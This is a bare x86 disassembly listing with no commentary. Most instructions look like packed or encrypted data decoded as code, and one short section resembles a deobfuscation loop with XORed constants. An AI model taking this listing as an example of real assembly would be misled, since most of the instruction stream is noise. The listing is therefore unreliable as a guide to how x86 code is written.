  408878:	sub    bh,BYTE PTR [ebp-0x3d6976e6]
  40887e:	xlat   BYTE PTR ds:[ebx]
  40887f:	xchg   esp,eax
  408880:	imul   ebp,ebx,0xffffffd4
  408883:	inc    ebp
  408884:	cmp    DWORD PTR [ebx-0x72],ecx
  408887:	and    ch,cl
  408889:	loopne 0x408830
  40888b:	add    BYTE PTR [ebp-0x80],ah
  40888e:	test   al,0x92
  408890:	shl    BYTE PTR [edi-0x6b970eef],1
  408896:	jb     0x40883a
  408898:	lods   eax,DWORD PTR ds:[esi]
  408899:	in     eax,dx
  40889a:	or     cl,BYTE PTR [ecx]
  40889c:	push   esi
  40889d:	hlt    
  40889e:	int    0x9e
  4088a0:	mov    ch,0x1d
  4088a2:	and    al,0x55
  4088a4:	mov    WORD PTR [esi-0x509c33d7],cx
  4088ab:	int3   
  4088ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ad:	pop    esi
  4088ae:	inc    edi
  4088af:	stc    
  4088b0:	outs   dx,BYTE PTR ds:[esi]
  4088b1:	mov    ebx,edx
  4088b3:	cmp    ebx,DWORD PTR [esi+0x5cc6e95d]
  4088b9:	inc    ecx
  4088ba:	pop    eax
  4088bb:	pop    esp
  4088bc:	jne    0x4088c5
  4088be:	rol    DWORD PTR [eax-0xfdf5463],1
  4088c4:	fs xchg ecx,eax
  4088c6:	jbe    0x408851
  4088c8:	stos   BYTE PTR es:[edi],al
  4088c9:	xor    al,0xb3
  4088cb:	mov    bl,bh
  4088cd:	loopne 0x4088d2
  4088cf:	mov    BYTE PTR [edi+0x22],cl
  4088d2:	push   cs
  4088d3:	sub    esp,DWORD PTR [ecx-0x64]
  4088d6:	mov    bl,0x36
  4088d8:	xor    eax,0x3d75631c
  4088dd:	(bad)  
  4088de:	mov    esp,0x2589f447
  4088e3:	dec    eax
  4088e5:	add    ebp,ebp
  4088e7:	jno    0x40891e
  4088e9:	add    BYTE PTR [edx+0x1571489],dh
  4088ef:	cli    
  4088f0:	gs iret 
  4088f2:	cs inc ebx
  4088f4:	rcr    DWORD PTR ds:0xc35be32f,cl
  4088fa:	add    DWORD PTR cs:[eax+esi*4],0xffffffb6
  4088ff:	hlt    
  408900:	push   esi
  408901:	icebp  
  408902:	push   ecx
  408903:	cli    
  408904:	xchg   edx,eax
  408905:	sub    al,0x49
  408907:	jecxz  0x4088cd
  408909:	ret    0x9ec7
  40890c:	shl    DWORD PTR [esi+esi*2+0x144d24f0],0x32
  408914:	lods   eax,DWORD PTR cs:[esi]
  408916:	(bad)  
  408918:	ret    
  408919:	xor    BYTE PTR [ebp-0x25],cl
  40891c:	dec    esi
  40891d:	sub    cl,BYTE PTR [edx]
  40891f:	lods   al,BYTE PTR ds:[esi]
  408920:	jo     0x408977
  408922:	mov    dh,0xac
  408924:	mov    bl,0x63
  408926:	popf   
  408927:	jp     0x408910
  408929:	sbb    esi,DWORD PTR [edx+ebp*4]
  40892c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40892d:	cmp    bh,dl
  40892f:	inc    eax
  408930:	dec    eax
  408931:	sbb    al,0x9e
  408933:	imul   esi,esp,0xfffffff1
  408936:	mov    esi,0x565a643e
  40893b:	push   0xca4b9a1a
  408940:	xor    BYTE PTR [edx+edi*8],dl
  408943:	dec    edx
  408944:	leave  
  408945:	push   ebp
  408946:	mov    al,ds:0xe5d4becd
  40894b:	(bad)
  40894e:	lock push ebx
  408950:	retf   
  408951:	cmp    ebx,ecx
  408953:	push   cs
  408954:	xchg   edx,eax
  408955:	add    bl,BYTE PTR [eax-0x59]
  408958:	out    0xc5,al
  40895a:	lahf   
  40895b:	std    
  40895c:	call   0x5a0a9e39
  408961:	out    dx,al
  408962:	(bad)  
  408963:	loopne 0x4089b0
  408965:	inc    BYTE PTR [eax+0x28f64d4d]
  40896b:	mov    edx,0x23eb749e
  408970:	dec    esi
  408971:	adc    BYTE PTR [eax+0x25d6e5c7],bh
  408977:	hlt    
  408978:	mul    BYTE PTR [ecx-0x395affd8]
  40897e:	fbstp  TBYTE PTR [edi]
  408980:	mov    esi,0xde08c03f
  408985:	mov    ecx,0xddb191df
  40898a:	inc    ebx
  40898b:	jne    0x40892b
  40898d:	xor    al,0x57
  40898f:	daa    
  408990:	fisttp QWORD PTR [ebx-0x9]
  408993:	jp     0x4089cd
  408995:	outs   dx,DWORD PTR ds:[esi]
  408996:	adc    eax,0x97c608cc
  40899b:	or     ebp,DWORD PTR [ecx]
  40899d:	mov    eax,gs
  40899f:	repz cmp ch,ah
  4089a2:	xchg   esi,eax
  4089a3:	jbe    0x408936
  4089a5:	dec    ebp
  4089a6:	cmp    eax,0xec1edf85
  4089ab:	clc    
  4089ac:	loope  0x40899f
  4089ae:	mov    ebp,0x319853ff
  4089b3:	add    al,cl
  4089b5:	inc    eax
  4089b6:	pop    ss
  4089b7:	pusha  
  4089b8:	addr16 push ss
  4089ba:	retf   0x213e
  4089bd:	imul   edx,DWORD PTR [edx-0x281af2a],0x169a754f
  4089c7:	stos   BYTE PTR es:[edi],al
  4089c8:	jnp    0x408a1b
  4089ca:	pop    ds
  4089cb:	mov    ds:0x312c4330,eax
  4089d0:	inc    edi
  4089d1:	out    0x31,eax
  4089d3:	inc    esi
  4089d4:	loop   0x408a16
  4089d6:	into   
  4089d7:	(bad)
  4089da:	cmp    edi,esi
  4089dc:	je     0x408a47
  4089de:	aas    
  4089df:	push   ds
  4089e0:	clc    
  4089e1:	pop    edx
  4089e2:	(bad)  
  4089e3:	xor    DWORD PTR ds:0xbfcee69c,ebp
  4089e9:	inc    ebp
  4089ea:	out    dx,al
  4089eb:	js     0x4089e1
  4089ed:	sub    ecx,edx
  4089ef:	rol    DWORD PTR [esi],0xab
  4089f2:	mov    ds:0xbab7edc3,eax
  4089f7:	mov    eax,ds:0x66611abe
  4089fc:	inc    esp
  4089fd:	stos   DWORD PTR es:[edi],eax
  4089fe:	ins    BYTE PTR es:[edi],dx
  4089ff:	jnp    0x4089ce
  408a01:	js     0x4089d9
  408a03:	xchg   edi,eax
  408a04:	call   0xb0d9:0x97eb362c
  408a0b:	cld    
  408a0c:	add    DWORD PTR [ebp-0x1c],edi
  408a0f:	xchg   esi,eax
  408a10:	xor    edi,DWORD PTR [edx+0x2d539de2]
  408a16:	fidiv  WORD PTR [ebp+0x22]
  408a19:	jae    0x408a79
  408a1b:	push   ecx
  408a1c:	push   cs
  408a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a1e:	lock out dx,eax
  408a20:	cmp    BYTE PTR [esi],dh
  408a22:	(bad)  
  408a23:	out    0x59,al
  408a25:	(bad)  
  408a26:	out    dx,al
  408a27:	mov    ds:0x1c4e8ebe,eax
  408a2c:	lods   al,BYTE PTR ds:[esi]
  408a2d:	cmp    al,0xe1
  408a2f:	cwde   
  408a30:	mov    dh,0xf7
  408a32:	les    ebx,FWORD PTR [esi+0x4ec4c100]
  408a38:	call   0x8393:0x40b84a0a
  408a3f:	cmp    ecx,DWORD PTR [ecx+0x7c]
  408a42:	(bad)  
  408a43:	mov    dh,0x50
  408a45:	ret    
  408a46:	mov    al,BYTE PTR [ebp-0x428e80e9]
  408a4c:	test   al,0x87
  408a4e:	mov    eax,0xa59a9a49
  408a53:	popf   
  408a54:	test   DWORD PTR [ebx+eiz*4],ebx
  408a57:	jle    0x408a6c
  408a59:	mov    ds:0xf22da4c3,al
  408a5e:	add    al,0x5a
  408a60:	ja     0x408a51
  408a62:	pop    ebp
  408a63:	adc    al,0x51
  408a65:	pop    esp
  408a66:	popa   
  408a67:	shr    BYTE PTR [ebp-0x1fad64e],1
  408a6d:	mov    edi,0x5e018963
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xb2b3a4f9
  408a92:	call   0xe47915ea
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408af9
  408a9e:	xor    DWORD PTR [edx],ebx
  408aa0:	xor    eax,0xb8fe211
  408aa5:	inc    esi
  408aa6:	or     edx,ebp
  408aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa9:	add    ebx,DWORD PTR [esi]
  408aab:	mov    bh,0x68
  408aad:	xchg   ebp,eax
  408aae:	ret    
  408aaf:	or     DWORD PTR [eax-0x58],esp
  408ab2:	and    BYTE PTR [edi-0x64],dl
  408ab5:	ficomp DWORD PTR [ebx-0x1c]
  408ab8:	add    DWORD PTR [ebx],edx
  408aba:	fld    DWORD PTR [esi*2+0x5f47912c]
  408ac1:	sbb    eax,0x3c05528f
  408ac6:	sub    al,al
  408ac8:	jb     0x408aa0
  408aca:	jae    0x408ad0
  408acc:	sbb    eax,0xaa012120
  408ad1:	xor    esi,esi
  408ad3:	out    0x3d,eax
  408ad5:	mov    ebp,0x94b0d59d
  408adb:	push   edx
  408adc:	xchg   esi,eax
  408add:	push   ebx
  408ade:	xchg   esp,eax
  408adf:	aad    0xa6
  408ae1:	xor    BYTE PTR [edi-0x50],bl
  408ae4:	not    DWORD PTR [eax]
  408ae6:	scas   al,BYTE PTR es:[edi]
  408ae7:	and    ecx,ebx
  408ae9:	cld    
  408aea:	pushf  
  408aeb:	pop    esi
  408aec:	inc    ebp
  408aed:	je     0x408a7f
  408aef:	add    al,dl
  408af1:	mov    edi,0xb3df39ed
  408af6:	xchg   edi,eax
  408af7:	nop
  408af8:	retf   
  408af9:	push   eax
  408afa:	mov    dl,0x6
  408afc:	hlt    
  408afd:	sub    DWORD PTR [eax+0x6e],eax
  408b00:	stos   BYTE PTR es:[edi],al
  408b01:	ds retf 
  408b03:	inc    esp
  408b04:	sub    BYTE PTR [ebx],dh
  408b06:	add    BYTE PTR [edx+0x7b09ca4],al
  408b0c:	and    al,0x8c
  408b0e:	add    al,0x10
  408b10:	push   eax
  408b11:	xlat   BYTE PTR ds:[ebx]
  408b12:	pop    es
  408b13:	sbb    BYTE PTR [edx],ah
  408b15:	leave  
  408b16:	call   0x9cd85fc8
  408b1b:	dec    edi
  408b1c:	push   eax
  408b1d:	xor    BYTE PTR [ecx],ch
  408b1f:	(bad)  
  408b20:	clc    
  408b21:	(bad)  
  408b22:	div    BYTE PTR [esp+edi*2-0x72de9ef]
  408b29:	sbb    al,0x27
  408b2b:	test   DWORD PTR [eax-0x34100cc7],edi
  408b31:	sub    al,0x80
  408b33:	(bad)  
  408b34:	retf   0x36bd
  408b37:	test   BYTE PTR [esp+edx*1],ah
  408b3a:	jbe    0x408afb
  408b3c:	ror    ah,0xa3
  408b3f:	ss mov db6,ebp
  408b43:	fs retf 0x5fe2
  408b47:	ror    BYTE PTR [edx],cl
  408b49:	sahf   
  408b4a:	push   0x58726646
  408b4f:	lahf   
  408b50:	or     BYTE PTR [edi-0x2e],0x6e
  408b54:	mov    cs,WORD PTR [edi+ebx*8]
  408b57:	imul   esi,esi,0xffffff8b
  408b5a:	add    al,0x77
  408b5c:	int    0xb
  408b5e:	xor    BYTE PTR [ebx+eax*2-0x45],dl
  408b62:	or     DWORD PTR ds:[ecx-0x29445a1d],esi
  408b69:	jmp    0x548b:0xc11ddb5e
  408b70:	loop   0x408be3
  408b72:	mov    cl,0x70
  408b74:	or     DWORD PTR [ebx-0x31],0x1a0623df
  408b7b:	ret    
  408b7c:	cmc    
  408b7d:	push   ebx
  408b7e:	in     eax,0x8a
  408b80:	sub    ch,BYTE PTR ds:0x29b077bf
  408b86:	mov    ds:0xfc062db2,eax
  408b8b:	mov    edx,0x875615bc
  408b90:	in     al,dx
  408b91:	ins    DWORD PTR es:[edi],dx
  408b92:	and    al,0x5f
  408b94:	push   eax
  408b95:	xor    DWORD PTR [ebx-0x2],ecx
  408b98:	cli    
  408b99:	ds inc eax
  408b9b:	cmp    DWORD PTR [ecx+0x34d11ad0],edi
  408ba1:	inc    esp
  408ba2:	xchg   DWORD PTR fs:[ebx+0x26f5cb0a],ecx
  408ba9:	mov    eax,ds:0xc51fe1d2
  408bae:	push   eax
  408baf:	fidivr DWORD PTR [eax-0x61]
  408bb2:	inc    edi
  408bb3:	mov    bh,0x83
  408bb5:	fs jmp 0x82cf:0xeea61959
  408bbd:	sub    esp,DWORD PTR [eax]
  408bbf:	retf   0xb10c
  408bc2:	push   ds
  408bc3:	shl    DWORD PTR [ebp+0x3eb27966],1
  408bc9:	repnz into 
  408bcb:	xchg   esi,eax
  408bcc:	lock cmp al,0x7
  408bcf:	cmp    DWORD PTR [ecx-0x22c42813],ecx
  408bd5:	mov    esi,0x2dfb6577
  408bda:	inc    edi
  408bdb:	repnz aad 0xda
  408bde:	outs   dx,BYTE PTR ds:[esi]
  408bdf:	mov    eax,0x74c5b43a
  408be4:	inc    edx
  408be5:	rcr    dl,0x51
  408be8:	dec    ecx
  408be9:	jnp    0x408bfa
  408beb:	cli    
  408bec:	hlt    
  408bed:	pop    eax
  408bee:	mov    eax,0x10738596
  408bf3:	addr16 pop ds
  408bf5:	fimul  DWORD PTR cs:[eax]
  408bf8:	xchg   ebp,eax
  408bf9:	push   eax
  408bfa:	leave  
  408bfb:	(bad)  
  408bfc:	cmp    al,0xed
  408bfe:	aad    0xd8
  408c00:	outs   dx,BYTE PTR ds:[si]
  408c02:	ret    
  408c03:	jae    0x408c32
  408c05:	fwait
  408c06:	inc    ebx
  408c07:	lock inc edx
  408c09:	pop    edi
  408c0a:	xchg   ebx,eax
  408c0b:	fnstcw WORD PTR [ebx-0x555d5638]
  408c11:	icebp  
  408c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c13:	xchg   ecx,eax
  408c14:	jb     0x408bc3
  408c16:	idiv   BYTE PTR ds:0x6107b73d
  408c1c:	mov    al,0xb7
  408c1e:	xchg   edx,eax
  408c1f:	retf   
  408c20:	cld    
  408c21:	dec    edx
  408c22:	scas   al,BYTE PTR es:[edi]
  408c23:	adc    BYTE PTR [edx-0x6d],0x47
  408c27:	scas   eax,DWORD PTR es:[edi]
  408c28:	inc    eax
  408c29:	and    dh,dl
  408c2b:	ficomp WORD PTR [ebx+0x4b]
  408c2e:	pop    es
  408c2f:	pop    edx
  408c30:	cwde   
  408c31:	or     DWORD PTR [eax-0x602ffb3],eax
  408c37:	mov    dl,BYTE PTR [eax]
  408c39:	mov    esi,0xc489676d
  408c3e:	xchg   edi,eax
  408c3f:	push   ebp
  408c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c41:	add    eax,edi
  408c43:	out    0x2b,al
  408c45:	jp     0x408bff
  408c47:	or     edx,DWORD PTR fs:[ecx-0x8]
  408c4b:	sahf   
  408c4c:	stos   BYTE PTR es:[edi],al
  408c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c4e:	ins    DWORD PTR es:[edi],dx
  408c4f:	das    
  408c50:	jmp    0x408cb9
  408c52:	and    DWORD PTR [esi],edx
  408c54:	out    dx,al
  408c55:	dec    ecx
  408c56:	and    BYTE PTR [edi],0x77
  408c59:	mov    ah,0xfc
  408c5b:	sar    DWORD PTR [eax-0x48a6e9ee],1
  408c61:	jp     0x408cd9
  408c63:	xchg   ebp,eax
  408c64:	xor    BYTE PTR [edx+0x2e],ch
  408c67:	add    eax,0x4c480e60
  408c6c:	and    al,0x3c
  408c6e:	and    dh,dl
  408c70:	arpl   si,dx
  408c72:	jo     0x408c94
  408c74:	fwait
  408c75:	sti    
  408c76:	jns    0x408c35
  408c78:	fstp   TBYTE PTR [ebx+eiz*4-0x77]
  408c7c:	jl     0x408cd4
  408c7e:	push   0x71
  408c80:	pop    edi
  408c81:	mov    ebx,0x9895bbd3
  408c86:	hlt    
  408c87:	jecxz  0x408ca3
  408c89:	rcr    DWORD PTR [ecx-0x7b],1
  408c8c:	jp     0x408c7b
  408c8e:	push   0xa5184e2f
  408c93:	das    
  408c94:	xchg   esi,eax
  408c95:	xor    edx,eax
  408c97:	stos   BYTE PTR es:[edi],al
  408c98:	icebp  
  408c99:	mov    edi,0x12266bf6
  408c9e:	call   0xb1d38892
  408ca3:	out    dx,eax
  408ca4:	jg     0x408d04
  408ca6:	cmp    eax,0x5b05806a
  408cab:	pop    eax
  408cac:	jmp    0xd848e3de
  408cb1:	nop
  408cb2:	aad    0xc6
  408cb4:	mov    esi,0xec61ba50
  408cb9:	pop    es
  408cba:	(bad)  
  408cbb:	call   0x962a3d8a
  408cc0:	lock sbb edi,DWORD PTR [edx-0x66599818]
  408cc7:	call   0x7bc3da23
  408ccc:	test   ah,bl
  408cce:	ror    DWORD PTR [ecx-0x60],1
  408cd1:	xchg   BYTE PTR [ebx+0x4b1e0cfd],dh
  408cd7:	aad    0x15
  408cd9:	leave  
  408cda:	pop    eax
  408cdb:	mov    bl,BYTE PTR [esi-0x7f217b09]
  408ce1:	or     eax,0xfd43a66f
  408ce6:	stos   DWORD PTR es:[edi],eax
  408ce7:	cmp    ebx,ecx
  408ce9:	sti    
  408cea:	push   ecx
  408ceb:	jecxz  0x408d6a
  408ced:	jg     0x408d57
  408cef:	cld    
  408cf0:	call   0x209ab125
  408cf5:	popa   
  408cf6:	call   0x9283a92c
  408cfb:	xchg   ch,bh
  408cfd:	mov    eax,ds:0x91240fd
  408d02:	jmp    0xf683c89b
  408d07:	push   es
  408d08:	sub    BYTE PTR [ecx-0x20],ch
  408d0b:	nop
  408d0c:	mov    edi,0xdc4dcd9a
  408d11:	xor    cl,bh
  408d13:	push   cs
  408d14:	retf   0x5fea
  408d17:	and    ebx,0xfffffffc
  408d1a:	(bad)
  408d1d:	(bad)  
  408d1e:	(bad)  
  408d1f:	sub    BYTE PTR [ebx+0x0],ah
  408d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d23:	ja     0x408cac
  408d25:	lds    edi,FWORD PTR [edi-0xa]
  408d28:	adc    bl,BYTE PTR [edx+0x2c]
  408d2b:	adc    al,0xb8
  408d2d:	in     eax,0xd6
  408d2f:	jbe    0x408d7b
  408d31:	stos   DWORD PTR es:[edi],eax
  408d32:	cmp    dh,BYTE PTR [ebx+0x7c9c2d7e]
  408d38:	mov    ax,ds:0x846440c7
  408d3e:	fcom   DWORD PTR [eax+0x3eb3ff95]
  408d44:	inc    ecx
  408d45:	lahf   
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42afed
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42b00d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42af41,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42af41
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42af41,ecx
  408d90:	cmp    DWORD PTR ds:0x42af41,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42af41,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42af41,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42af41
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42af41,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42af75
  408ddc:	xor    ecx,DWORD PTR ds:0x42af3d
  408de2:	mov    DWORD PTR ds:0x42af75,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42af89,0x42aee5
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42aefd,0x42af79
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffa3
  408e1d:	adc    edx,edx
  408e1f:	shl    BYTE PTR [edi-0x16],1
  408e22:	js     0x408e9c
  408e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e25:	jle    0x408e9f
  408e27:	js     0x408e44
  408e29:	pop    eax
  408e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2b:	call   0xc6b9:0xec05c6b5
  408e32:	shr    BYTE PTR [ecx+ebp*8],cl
  408e35:	or     al,0xd
  408e37:	pushf  
  408e38:	push   0x1f7ee165
  408e3d:	mov    cl,0x1e
  408e3f:	pushf  
  408e40:	retf   
  408e41:	mov    WORD PTR [ebx+0x2c],cs
  408e44:	sbb    DWORD PTR [edi+0x7b49120e],ecx
  408e4a:	dec    eax
  408e4b:	test   BYTE PTR [esp+eiz*4-0x6a8e583f],cl
  408e52:	sahf   
  408e53:	scas   al,BYTE PTR es:[edi]
  408e54:	pusha  
  408e55:	jmp    0x408e73
  408e57:	repnz sub dl,BYTE PTR ds:0xb7851d18
  408e5e:	sti    
  408e5f:	and    bh,BYTE PTR [ebp-0x2af68ccb]
  408e65:	push   edx
  408e66:	fnstcw WORD PTR [edi+0x382cd69b]
  408e6c:	in     al,dx
  408e6d:	sbb    esi,DWORD PTR [ebx-0x63543acf]
  408e73:	inc    ebx
  408e74:	dec    ecx
  408e75:	cmp    al,0x66
  408e77:	dec    edi
  408e78:	cmp    DWORD PTR [ebp+0x7d],ebx
  408e7b:	xor    DWORD PTR [edi],ebp
  408e7d:	shl    BYTE PTR [eax-0x29973e5f],1
  408e83:	shl    DWORD PTR [edi],0x11
  408e86:	not    DWORD PTR [eax]
  408e88:	(bad)  
  408e89:	test   DWORD PTR [edi],0x6405c5b9
  408e8f:	mov    al,0x3b
  408e91:	mov    eax,DWORD PTR [eax+0x16]
  408e94:	sub    cl,al
  408e96:	mov    BYTE PTR [ebx+0x15f22689],bh
  408e9c:	mov    bl,BYTE PTR [ecx]
  408e9e:	leave  
  408e9f:	ret    0x37fd
  408ea2:	cld    
  408ea3:	sbb    BYTE PTR [eax-0x3a],bl
  408ea6:	push   ebp
  408ea7:	scas   eax,DWORD PTR es:[edi]
  408ea8:	mov    al,ds:0x4d4b8e66
  408ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eae:	xchg   esi,eax
  408eaf:	dec    eax
  408eb0:	sbb    eax,0xe779bd92
  408eb5:	(bad)  
  408eb6:	mov    esi,0xdb75027a
  408ebb:	adc    dh,BYTE PTR [ebx-0x32]
  408ebe:	test   eax,0x5dca5cbf
  408ec3:	addr16 inc esi
  408ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec6:	in     al,0xfe
  408ec8:	xchg   ebp,eax
  408ec9:	shl    DWORD PTR [eax],1
  408ecb:	mov    ebx,0x2466b
  408ed0:	inc    edx
  408ed1:	mov    ecx,0xc9325868
  408ed6:	dec    esp
  408ed7:	xchg   esp,eax
  408ed8:	xchg   ebx,eax
  408ed9:	push   0x42b8226d
  408ede:	or     eax,0xbcdc9ed3
  408ee3:	sub    bh,ch
  408ee5:	(bad)  
  408ee6:	mov    ebx,edx
  408ee8:	push   esi
  408eea:	inc    esi
  408eeb:	mov    BYTE PTR [esp+edi*2-0x24],dl
  408eef:	or     DWORD PTR [ebp+0x6e],0x64
  408ef3:	xchg   esp,eax
  408ef4:	daa    
  408ef5:	pop    edi
  408ef6:	dec    edi
  408ef7:	dec    ecx
  408ef8:	fnstsw WORD PTR [esi]
  408efa:	mov    eax,0x1f6171c5
  408eff:	mov    esi,0x2f951b54
  408f04:	fcom   DWORD PTR [eax]
  408f06:	and    eax,0x743da113
  408f0b:	daa    
  408f0c:	lds    edi,FWORD PTR [esi]
  408f0e:	cmp    BYTE PTR [esi],dh
  408f10:	push   cs
  408f11:	mov    ebp,0xf7f74045
  408f16:	push   edi
  408f18:	into   
  408f19:	jb     0x408ed3
  408f1b:	stos   BYTE PTR es:[edi],al
  408f1c:	or     al,0x9e
  408f1e:	fcom   st(5)
  408f20:	pop    edx
  408f21:	sbb    bh,BYTE PTR [edx+0x100f56f6]
  408f27:	push   edx
  408f28:	push   esi
  408f29:	push   edx
  408f2a:	xchg   edx,eax
  408f2b:	into   
  408f2c:	xchg   edi,eax
  408f2d:	jmp    0x408f4c
  408f2f:	mov    ecx,0x78f42fc3
  408f34:	repnz xor edx,DWORD PTR [ecx]
  408f37:	cli    
  408f38:	mov    cl,0xb4
  408f3a:	out    0xad,eax
  408f3c:	aad    0xf7
  408f3e:	sahf   
  408f3f:	sbb    cl,BYTE PTR [edi-0x5d0371ab]
  408f45:	jp     0x408f7f
  408f47:	jmp    0xb7c1:0x7551342e
  408f4e:	inc    ebp
  408f4f:	ds icebp 
  408f51:	xchg   edi,eax
  408f52:	adc    DWORD PTR [ecx+0x38],edx
  408f55:	xor    DWORD PTR [esp+ecx*2+0x1],0xfffffffb
  408f5a:	jle    0x408f1b
  408f5c:	or     DWORD PTR [ecx+0x18],ebx
  408f5f:	push   0x3e
  408f61:	addr16 (bad) 
  408f63:	xchg   eax,esp
  408f65:	mov    al,0xbf
  408f67:	arpl   sp,bx
  408f69:	inc    ebx
  408f6a:	loope  0x408fe8
  408f6c:	jecxz  0x408f51
  408f6e:	fstp   TBYTE PTR [edi-0x722fa9b2]
  408f74:	cmp    eax,0x0
  408f77:	xchg   ebp,eax
  408f78:	or     ah,BYTE PTR [edi]
  408f7a:	not    BYTE PTR ds:0xa2f6e968
  408f80:	test   eax,0x6be0d6e7
  408f85:	mov    al,BYTE PTR [edx-0x80]
  408f88:	xor    ch,BYTE PTR [ecx*2+0x3273b26d]
  408f8f:	test   cl,0xbf
  408f92:	and    ebp,edx
  408f94:	popf   
  408f95:	adc    BYTE PTR [ecx],bl
  408f97:	clc    
  408f98:	(bad)
  408f9b:	adc    ebp,eax
  408f9d:	jecxz  0x408fb1
  408f9f:	mov    ebx,0xc589669e
  408fa4:	jmp    0x408fd1
  408fa6:	jg     0x408fc2
  408fa8:	and    al,0x1c
  408faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fab:	or     al,BYTE PTR [ebp+0x5bc7911]
  408fb1:	sbb    eax,0xb962c354
  408fb6:	sub    eax,0x1a8544c8
  408fbb:	inc    ebp
  408fbc:	callw  0x55c9
  408fc0:	cmp    BYTE PTR [esp+ebx*8+0x40149bfc],dl
  408fc7:	in     eax,0xf7
  408fc9:	test   cl,dh
  408fcb:	stos   BYTE PTR es:[edi],al
  408fcc:	lods   eax,DWORD PTR ds:[esi]
  408fcd:	retf   0xa4c8
  408fd0:	xor    eax,0xfc982995
  408fd5:	inc    eax
  408fd6:	shl    DWORD PTR [edx+0x5df2a9c0],0x69
  408fdd:	jl     0x409037
  408fdf:	jle    0x408f82
  408fe1:	test   al,0x10
  408fe3:	add    bh,BYTE PTR [esi]
  408fe5:	aaa    
  408fe6:	call   0x8978:0x1b411e8d
  408fed:	and    al,0xcd
  408fef:	hlt    
  408ff0:	xchg   ebp,eax
  408ff1:	fwait
  408ff2:	pop    esp
  408ff3:	jne    0x409032
  408ff5:	in     al,0x6b
  408ff7:	addr16 aaa 
  408ff9:	push   ebx
  408ffa:	push   0x195aa031
  408fff:	mov    bl,0x35
  409001:	(bad)  
  409002:	outs   dx,DWORD PTR ds:[esi]
  409003:	xchg   edi,eax
  409004:	into   
  409005:	(bad)  
  409006:	in     al,0xc8
  409008:	jns    0x409079
  40900a:	loop   0x408fc8
  40900c:	push   esp
  40900d:	icebp  
  40900e:	jne    0x40908d
  409010:	mov    ebx,0xe36ee921
  409015:	fwait
  409016:	xchg   ecx,eax
  409017:	mov    al,0x15
  409019:	(bad)  
  40901a:	jmp    0x40905a
  40901c:	sbb    BYTE PTR [eax+0x66bfe941],bl
  409022:	push   esp
  409023:	xlat   BYTE PTR ds:[ebx]
  409024:	push   0x5805cee1
  409029:	lock or al,BYTE PTR [ecx+0x19]
  40902d:	int    0x65
  40902f:	hlt    
  409030:	scas   eax,DWORD PTR es:[edi]
  409031:	jge    0x409083
  409033:	ret    0x86a0
  409036:	ret    
  409037:	stos   DWORD PTR es:[edi],eax
  409038:	xchg   esp,eax
  409039:	(bad)  
  40903a:	fdivr  QWORD PTR [esi-0x2a63d1b2]
  409040:	loop   0x409022
  409042:	and    BYTE PTR [edx],ah
  409044:	xor    al,0x58
  409046:	or     ebp,DWORD PTR [ecx]
  409048:	inc    dh
  40904a:	jbe    0x409074
  40904c:	pop    ds
  40904d:	xchg   DWORD PTR [ebx],ecx
  40904f:	or     DWORD PTR [edx],ecx
  409051:	push   esp
  409052:	mov    ebp,0xade55ab2
  409057:	scas   eax,DWORD PTR es:[edi]
  409058:	add    ch,BYTE PTR [edx-0x5d845c6d]
  40905e:	pop    ebx
  40905f:	shr    DWORD PTR [ebp-0x2],cl
  409062:	paddq  mm2,mm7
  409065:	jmp    0x5978c792
  40906a:	mov    bh,0x7c
  40906c:	aas    
  40906d:	push   0x1bd95ca5
  409072:	cdq    
  409073:	clc    
  409074:	cmp    al,0x8d
  409076:	push   esi
